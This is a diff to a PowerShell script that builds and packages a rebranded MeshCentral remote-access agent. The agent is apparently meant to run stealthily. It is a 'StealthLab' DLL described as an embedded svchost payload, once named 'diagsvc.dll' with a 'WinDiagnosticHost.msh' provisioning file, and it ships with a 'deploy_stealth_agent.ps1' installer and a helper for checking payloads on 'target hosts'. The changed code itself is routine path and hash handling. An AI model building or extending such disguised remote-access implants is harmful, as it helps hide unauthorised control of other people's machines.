@@ -28,7 +28,7 @@
     Do not validate Authenticode signatures when staging binaries.
 
 .PARAMETER SkipSvchostValidation
-    Skip validation of the embedded svchost payload header/metadata.
+    Skip validation of the embedded svchost payload resource/metadata.
 
 .PARAMETER SkipTests
     Pass -SkipTests through to build.ps1.
@@ -117,6 +117,8 @@ if (-not (Test-Path -LiteralPath $brandingHelperScript)) {
 }
 . $brandingHelperScript
 $brandingConfigInfo = Get-BrandingConfig -RepoRoot $script:RepoRoot -Quiet
+$script:BrandingConfig = $brandingConfigInfo.Config
+$script:SvchostDllName = Get-BrandingSvchostDllName -Config $script:BrandingConfig
 $script:BrandingConfigPath = $brandingConfigInfo.Path
 Write-Info ("Branding config : {0}" -f $script:BrandingConfigPath)
 $script:BrandingServiceName = $null
@@ -197,6 +199,31 @@ function Get-AgentOutputPath {
     return $null
 }
 
+function Resolve-ProvisioningManifestPath {
+    $candidatePaths = New-Object System.Collections.Generic.List[string]
+
+    if ($env:MESH_MSH_FILENAME) {
+        [void]$candidatePaths.Add((Join-Path $script:RepoRoot $env:MESH_MSH_FILENAME))
+    }
+
+    [void]$candidatePaths.Add((Join-Path $script:RepoRoot 'meshagent.msh'))
+
+    $rootMshFiles = @(Get-ChildItem -LiteralPath $script:RepoRoot -Filter *.msh -File -ErrorAction SilentlyContinue | Sort-Object Name)
+    foreach ($file in $rootMshFiles) {
+        if (-not ($candidatePaths -contains $file.FullName)) {
+            [void]$candidatePaths.Add($file.FullName)
+        }
+    }
+
+    foreach ($path in $candidatePaths) {
+        if (-not [string]::IsNullOrWhiteSpace($path) -and (Test-Path -LiteralPath $path)) {
+            return (Resolve-Path -LiteralPath $path).ProviderPath
+        }
+    }
+
+    throw "Unable to resolve provisioning manifest (.msh) under the repository root. Set MESH_MSH_FILENAME or add the expected payload."
+}
+
 function Ensure-SvchostResource {
     param(
         [Parameter(Mandatory = $true)][string]$Path,
@@ -206,20 +233,35 @@ function Ensure-SvchostResource {
     if ($SkipSvchostValidation) { return }
     if ($script:SvchostHeaderValidated) { return }
 
-    $headerPath = Join-Path $script:RepoRoot 'meshcore\embedded\generated\svchost_payload.h'
-    if (-not (Test-Path -LiteralPath $headerPath)) {
-        throw "Embedded svchost payload header missing at $headerPath"
+    $resourcePath = Join-Path $script:RepoRoot 'meshservice\embedded\svchost_payload.dll'
+    if (-not (Test-Path -LiteralPath $resourcePath)) {
+        throw "Embedded svchost payload resource missing at $resourcePath"
     }
 
     $metadataPath = Join-Path $script:RepoRoot 'meshcore\embedded\generated\svchost_payload.json'
     if (Test-Path -LiteralPath $metadataPath) {
         try {
             $metadata = Get-Content -LiteralPath $metadataPath -Raw | ConvertFrom-Json -ErrorAction Stop
-            if ($metadata -and $metadata.sha256 -and $metadata.input -and (Test-Path -LiteralPath $metadata.input)) {
+            if ($metadata -and $metadata.sha256) {
                 $expected = ($metadata.sha256.ToString()).ToLowerInvariant()
-                $actual = ((Get-FileHash -Path $metadata.input -Algorithm SHA256).Hash).ToLowerInvariant()
-                if ($expected -ne $actual) {
-                    throw "Embedded payload metadata hash mismatch (expected $expected, actual $actual)"
+                $sourceActual = ((Get-FileHash -LiteralPath $resourcePath -Algorithm SHA256).Hash).ToLowerInvariant()
+                if ($expected -ne $sourceActual) {
+                    throw "Embedded payload resource hash mismatch (expected $expected, actual $sourceActual)"
+                }
+
+                $comparisonPath = if ([System.IO.Path]::GetExtension($Path).Equals('.dll', [System.StringComparison]::OrdinalIgnoreCase)) { $Path } else { $resourcePath }
+                if (Test-Path -LiteralPath $comparisonPath) {
+                    $comparisonActual = ((Get-FileHash -LiteralPath $comparisonPath -Algorithm SHA256).Hash).ToLowerInvariant()
+                    if ($expected -ne $comparisonActual) {
+                        throw ("Embedded payload validation mismatch for {0} ({1})" -f $Description, $comparisonPath)
+                    }
+                }
+
+                if ($metadata.input -and (Test-Path -LiteralPath $metadata.input)) {
+                    $inputActual = ((Get-FileHash -LiteralPath $metadata.input -Algorithm SHA256).Hash).ToLowerInvariant()
+                    if ($expected -ne $inputActual) {
+                        throw "Embedded payload metadata source hash mismatch."
+                    }
                 }
             }
         } catch {
@@ -453,7 +495,7 @@ if (-not $SkipPackage) {
         $brandingConfigPath = $script:BrandingConfigPath
         if (Test-Path -LiteralPath $brandingConfigPath) {
             try {
-                $brandingObject = Get-Content -Path $brandingConfigPath -Raw | ConvertFrom-Json -Depth 10
+                $brandingObject = Get-Content -Path $brandingConfigPath -Raw | ConvertFrom-Json
                 if ($brandingObject -and $brandingObject.branding) {
                     $manifest.branding = [ordered]@{
                         serviceName = $brandingObject.branding.serviceName
@@ -470,6 +512,7 @@ if (-not $SkipPackage) {
         }
 
         $artefacts = @()
+        $packagedSvchostDllName = if ([string]::IsNullOrWhiteSpace($script:SvchostDllName)) { 'meshsvc.dll' } else { $script:SvchostDllName }
 
         $dllPath = Get-AgentOutputPath -Configuration 'StealthLab_DLL' -Platform 'x64'
         if (-not $dllPath) {
@@ -477,7 +520,7 @@ if (-not $SkipPackage) {
         }
         $artefacts += @{
             Source = $dllPath
-            Destination = 'diagsvc.dll'
+            Destination = $packagedSvchostDllName
             Required = $true
             Kind = 'dll'
             ValidateSvchost = $true
@@ -508,8 +551,10 @@ if (-not $SkipPackage) {
             }
         }
 
+        $provisioningPath = Resolve-ProvisioningManifestPath
+        $provisioningFileName = Split-Path -Path $provisioningPath -Leaf
         $artefacts += @(
-            @{ Source = Join-Path $script:RepoRoot 'WinDiagnosticHost.msh'; Destination = 'WinDiagnosticHost.msh'; Required = $true;  Kind = 'data';   ValidateSvchost = $false; Description = 'Provisioning payload (.msh)' },
+            @{ Source = $provisioningPath; Destination = $provisioningFileName; Required = $true;  Kind = 'data';   ValidateSvchost = $false; Description = 'Provisioning payload (.msh)' },
             @{ Source = $script:BrandingConfigPath; Destination = 'branding_config.local.json'; Required = $false; Kind = 'data';   ValidateSvchost = $false; Description = 'Branding configuration used for build' },
             @{ Source = Join-Path $script:RepoRoot 'deploy_stealth_agent.ps1'; Destination = 'install.ps1'; Required = $false; Kind = 'script'; ValidateSvchost = $false; Description = 'Installer helper script' },
             @{ Source = Join-Path $script:RepoRoot 'audit_and_debug_svchost.ps1'; Destination = 'tools\audit_and_debug_svchost.ps1'; Required = $false; Kind = 'script'; ValidateSvchost = $false; Description = 'SVCHOST payload audit helper' },
@@ -573,7 +618,7 @@ if (-not $SkipPackage) {
                 signatureTimestamp = $signatureInfo.Timestamp
             }
 
-            if ($item.Kind -eq 'dll' -and $item.Destination -eq 'diagsvc.dll') {
+            if ($item.Kind -eq 'dll' -and $item.Destination -eq $packagedSvchostDllName) {
                 $script:DllHash = $hash
             }
         }
@@ -595,9 +640,10 @@ if (-not $SkipPackage) {
         $readmeLines += ""
         $readmeLines += ("Build timestamp : {0}" -f (Get-Date).ToString('yyyy-MM-dd HH:mm:ss'))
         $readmeLines += ("Configuration   : {0}" -f $Configuration)
-        $readmeLines += ("Git commit      : {0}" -f ($script:GitCommit ?? 'n/a'))
+        $gitCommitValue = if ([string]::IsNullOrWhiteSpace($script:GitCommit)) { 'n/a' } else { $script:GitCommit }
+        $readmeLines += ("Git commit      : {0}" -f $gitCommitValue)
         if ($script:DllHash) {
-            $readmeLines += ("diagsvc.dll SHA256 : {0}" -f $script:DllHash)
+            $readmeLines += ("{0} SHA256 : {1}" -f $packagedSvchostDllName, $script:DllHash)
         }
         $readmeLines += ""
         $readmeLines += "Included files"
@@ -608,7 +654,7 @@ if (-not $SkipPackage) {
         $readmeLines += ""
         $readmeLines += "Deployment Notes"
         $readmeLines += "----------------"
-        $readmeLines += "1. Upload diagsvc.dll to the MeshCentral agents-custom directory (rename to meshagent_win32_x64.exe)."
+        $readmeLines += ("1. Upload {0} to the MeshCentral agents-custom directory if you are staging the svchost payload separately." -f $packagedSvchostDllName)
         $readmeLines += "2. Optionally replace MeshService64.exe/MeshService.exe under meshcentral-data\agents if overriding executables."
         $readmeLines += "3. Restart the MeshCentral service and download the agent to verify the deployment."
         $readmeLines += "4. Use tools\audit_and_debug_svchost.ps1 to validate svchost payloads on target hosts."
@@ -668,7 +714,7 @@ if (-not $SkipPackage -and $RunHealthCheck) {
             $relativeReport = Normalize-RelativePath -Root $script:PackageDir -Path $reportPath
             $healthSummary = $null
             try {
-                $reportObject = Get-Content -Path $reportPath -Raw | ConvertFrom-Json -Depth 10
+                $reportObject = Get-Content -Path $reportPath -Raw | ConvertFrom-Json
                 if ($reportObject -and $reportObject.summary) {
                     $healthSummary = $reportObject.summary
                     Write-Info ("Health summary : Total={0}, Passed={1}, Warnings={2}, Failed={3}" -f $healthSummary.total, $healthSummary.passed, $healthSummary.warnings, $healthSummary.failed)
@@ -697,7 +743,7 @@ if (-not $SkipPackage -and $RunHealthCheck) {
 
             if ($script:PackageManifestPath -and (Test-Path -LiteralPath $script:PackageManifestPath)) {
                 try {
-                    $manifestObject = Get-Content -Path $script:PackageManifestPath -Raw | ConvertFrom-Json -Depth 10
+                    $manifestObject = Get-Content -Path $script:PackageManifestPath -Raw | ConvertFrom-Json
                     if ($manifestObject) {
                         $manifestObject.healthReport = [ordered]@{
                             path    = $relativeReport
@@ -764,7 +810,8 @@ if (-not $SkipPackage) {
         Write-Warn "Health check was requested but no report was produced."
     }
     if ($script:DllHash) {
-        Write-Info ("diagsvc.dll SHA256 : {0}" -f $script:DllHash)
+        $hashLabel = if ([string]::IsNullOrWhiteSpace($script:SvchostDllName)) { 'meshsvc.dll' } else { $script:SvchostDllName }
+        Write-Info ("{0} SHA256 : {1}" -f $hashLabel, $script:DllHash)
     }
 } else {
     Write-Warn "Packaging stage skipped; no artefacts generated."
